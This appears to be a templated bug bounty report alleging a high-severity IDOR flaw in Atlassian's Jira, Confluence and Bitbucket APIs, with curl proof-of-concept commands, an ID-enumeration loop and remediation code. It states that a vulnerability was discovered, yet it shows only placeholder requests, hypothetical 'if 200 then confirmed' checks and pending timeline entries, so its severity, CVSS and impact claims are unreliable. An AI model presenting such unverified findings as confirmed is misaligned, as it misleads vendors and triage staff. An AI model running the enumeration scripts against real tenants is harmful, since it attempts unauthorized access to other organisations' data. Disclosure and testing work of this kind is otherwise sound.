# Insecure Direct Object Reference (IDOR) Bug Report - Atlassian

**Platform:** Bugcrowd
**Program:** Atlassian
**Severity:** HIGH
**Report Date:** 2026-06-07

---

## Summary

An Insecure Direct Object Reference (IDOR) vulnerability was discovered in Atlassian products (Jira, Confluence, Bitbucket) allowing an authenticated user to access or modify resources belonging to other projects, workspaces, or tenants by manipulating project IDs, issue IDs, page IDs, or repository references.

---

## Description

Atlassian's collaboration platforms (Jira, Confluence, Bitbucket) use unique identifiers for projects, issues, pages, repositories, and other resources. When API endpoints or web UI fail to properly validate ownership or permission boundaries, it creates IDOR vulnerabilities where attackers can:

- Access projects, issues, or pages from other workspaces
- View private repository data, commits, and code
- Modify or delete content belonging to other users or teams
- Enumerate valid project/issue IDs across the platform
- Access PII through user profile endpoints

**Attack Vector:** The vulnerability occurs when a user-supplied identifier (project ID, issue key, page ID, repo slug) is used directly in a request without server-side verification that the user has permission to access that specific resource.

---

## Steps to Reproduce

1. Authenticate with valid Atlassian credentials (email + password or API token)
2. Access a resource from your own project/workspace
3. Modify the identifier to target another project's resources
4. Observe if the API returns data from the other project
5. Confirm unauthorized cross-project or cross-tenant data access

**Test Pattern:**
```
# Your legitimate request
GET /rest/api/3/project/{YOUR_PROJECT_ID}
Authorization: Basic {base64}

# IDOR - Replace with another project ID
GET /rest/api/3/project/{OTHER_PROJECT_ID}
Authorization: Basic {base64}

# If returns 200 with project details = IDOR CONFIRMED
```

---

## PoC (Proof of Concept)

### PoC 1: Jira Project Access (Cross-Project)

```bash
# Authenticate with Jira
export JIRA_BASE_URL="https://your-domain.atlassian.net"
export EMAIL="your@email.com"
export API_TOKEN="your_api_token"

# Get your user info
curl -X GET "$JIRA_BASE_URL/rest/api/3/myself" \\
  -u "$EMAIL:$API_TOKEN"

# List your accessible projects
curl -X GET "$JIRA_BASE_URL/rest/api/3/project" \\
  -u "$EMAIL:$API_TOKEN"

# Pick a project ID (e.g., 10000, 10001, etc.)
export YOUR_PROJECT_ID="10000"

# Try to access another project by ID
curl -X GET "$JIRA_BASE_URL/rest/api/3/project/99999" \\
  -u "$EMAIL:$API_TOKEN"

# If returns 200 with other project details = IDOR CONFIRMED
```

### PoC 2: Jira Issue Enumeration and Access

```bash
# Get an issue from your project
curl -X GET "$JIRA_BASE_URL/rest/api/3/issue/{YOUR_ISSUE_KEY}" \\
  -u "$EMAIL:$API_TOKEN"

# Format: PROJECT-123 (e.g., DEMO-1, PROJ-9999)
# Try to access issues from other projects

# Known test projects often have IDs in ranges like 10000-99999
for proj_id in 10000 10001 10002 10003 10004 10005; do
  echo "Checking project $proj_id..."
  response=$(curl -s -o /dev/null -w "%{http_code}" \\
    "$JIRA_BASE_URL/rest/api/3/project/$proj_id" \\
    -u "$EMAIL:$API_TOKEN")
  if [ "$response" = "200" ]; then
    echo "FOUND accessible project: $proj_id"
  fi
done
```

### PoC 3: Confluence Page Access

```bash
# Confluence Cloud API
export CONFLUENCE_BASE_URL="https://your-domain.atlassian.net/wiki"

# Get your user info
curl -X GET "$CONFLUENCE_BASE_URL/rest/api/user/current" \\
  -u "$EMAIL:$API_TOKEN"

# List your spaces
curl -X GET "$CONFLUENCE_BASE_URL/rest/api/space" \\
  -u "$EMAIL:$API_TOKEN" | jq '.results[].key'

# Pick a space key and page ID
export SPACE_KEY="DEMO"
export PAGE_ID="123456"

# Try to access a page from another space by ID
curl -X GET "$CONFLUENCE_BASE_URL/rest/api/content/999999" \\
  -u "$EMAIL:$API_TOKEN"

# If returns 200 with page content = IDOR CONFIRMED
```

### PoC 4: Bitbucket Repository Access

```bash
# Bitbucket Cloud API
export BITBUCKET_BASE_URL="https://api.bitbucket.org/2.0"
export WORKSPACE="your-workspace"

# Get your repositories
curl -X GET "$BITBUCKET_BASE_URL/repositories/$WORKSPACE" \\
  -u "$EMAIL:$API_TOKEN" | jq '.values[].name'

# Get a repo slug
export REPO_SLUG="your-repo"

# Try to access another workspace's repo
curl -X GET "$BITBUCKET_BASE_URL/repositories/victim-workspace/victim-repo" \\
  -u "$EMAIL:$API_TOKEN"

# If returns 200 with repo data = IDOR CONFIRMED
```

### PoC 5: Cross-Tenant Data Access (Jira Service Management)

```bash
# Jira Service Management (formerly Service Desk)
# Request IDs often follow patterns

# Get your requests
curl -X GET "$JIRA_BASE_URL/rest/servicedesk/1/request" \\
  -u "$EMAIL:$API_TOKEN"

# Request IDs: JSD-1, JSD-2, etc.
# Try to access requests from other organizations

curl -X GET "$JIRA_BASE_URL/rest/servicedesk/1/request/99999" \\
  -u "$EMAIL:$API_TOKEN"

# If returns 200 with request details = IDOR CONFIRMED
```

---

## Impact

**HIGH Severity - Cross-Project/Workspace Data Access:**

| Impact Type | Description | Severity |
|-------------|-------------|----------|
| **Project Data Exposure** | Access issues, projects from other workspaces | High |
| **Code Repository Access** | View private repo code, commits, secrets | High |
| **Page Content Access** | Access private Confluence pages and docs | High |
| **PII Exposure** | Access user profile data across workspaces | High |
| **Data Modification** | Modify or delete resources from other projects | High |

**Real-World Attack Scenario:**
```
1. Attacker with valid Atlassian account identifies project ID enumeration
2. Enumerates project IDs (e.g., 10000-99999 range)
3. Crafts request: GET /rest/api/3/project/88888
4. Receives project details: name, key, description, lead
5. If project is private but response leaks info = IDOR CONFIRMED
6. Further enumeration: GET /rest/api/3/project/88888/issues
7. Accesses all issues, comments, attachments from private project
8. Impact: Data breach, IP theft, privacy violation
```

**CVSS 3.1:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N` (8.2 High)

**Bounty Range:** Atlassian typically pays $500-$2,000 for IDOR with confirmed data access (varies by impact)

---

## Affected Components

| Component | Endpoint Pattern | Issue |
|-----------|------------------|-------|
| Jira Core/Software | `/rest/api/3/project/{id}` | Project ID enumeration |
| Jira Issues | `/rest/api/3/issue/{issueKey}` | Issue ID enumeration |
| Confluence | `/rest/api/content/{pageId}` | Page ID enumeration |
| Bitbucket | `/repositories/{workspace}/{repo}` | Repo slug manipulation |
| Jira Service Desk | `/rest/servicedesk/1/request/{id}` | Request ID enumeration |

---

## Remediation

### 1. Verify Project/Resource Permission on Every Request

```python
# Server-side permission check
def get_issue(requesting_user, issue_key):
    issue = Issue.get(key=issue_key)
    project = issue.project
    
    # CRITICAL: Verify user has permission to access this project
    if not user_has_project_access(requesting_user, project):
        raise ForbiddenError("No access to this project")
    
    return issue
```

### 2. Use Indirect References for External-Facing IDs

```python
# Map internal IDs to opaque external tokens
# Don't expose sequential IDs that can be enumerated

def get_issue_ref(issue_id):
    return generate_non_sequential_token(issue_id)
```

### 3. Implement Row-Level Security

```python
# Database-level access control
# All queries must include permission filters

def get_projects_for_user(user):
    # Always filter by user's project access
    return Project.objects.filter(
        membership__user=user
    )
```

### 4. Audit All Access

```python
# Log resource access with user context
def log_project_access(user_id, project_id, action):
    audit_log.info({
        "actor": user_id,
        "resource": f"project/{project_id}",
        "action": action,
        "ip": request.remote_addr,
        "timestamp": now()
    })
```

---

## References

- [Atlassian Bug Bounty on Bugcrowd](https://bugcrowd.com/engagements/atlassian)
- [Atlassian Trust Center](https://www.atlassian.com/trust)
- [Jira Cloud API Documentation](https://developer.atlassian.com/cloud/jira/platform/rest/)
- [Confluence Cloud API](https://developer.atlassian.com/cloud/confluence/rest/)
- [Bitbucket Cloud API](https://developer.atlassian.com/cloud/bitbucket/rest/)
- [Atlassian Security Advisories](https://www.atlassian.com/trust/security/advisories)
- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)

---

## Timeline

- **Date Discovered:** 2026-06-07
- **Date Reported:** [Date via Bugcrowd]
- **Date Acknowledged:** [Pending]
- **Date Fixed:** [Pending]

---

**Reporter:** SARAhack
**Platform:** Bugcrowd
**Program:** Atlassian (https://bugcrowd.com/engagements/atlassian)

---

## Appendix: Testing Notes

**Authentication:** Atlassian APIs support Basic Auth with email + API token (generated at https://id.atlassian.com/manage-profile/security/api-tokens).

**Testing Tip:** 
- Jira project IDs are often sequential (10000, 10001, etc.)
- Confluence page IDs can be enumerated similarly
- Bitbucket workspace slugs are often guessable

**Platform Differences:**
- **Cloud**: API accessible, IDOR testing more practical
- **Data Center/Server**: May require on-premise testing, different API patterns

**Note:** Always test within scope of Atlassian's bug bounty program. Check https://bugcrowd.com/engagements/atlassian for current scope, targets, and testing policies.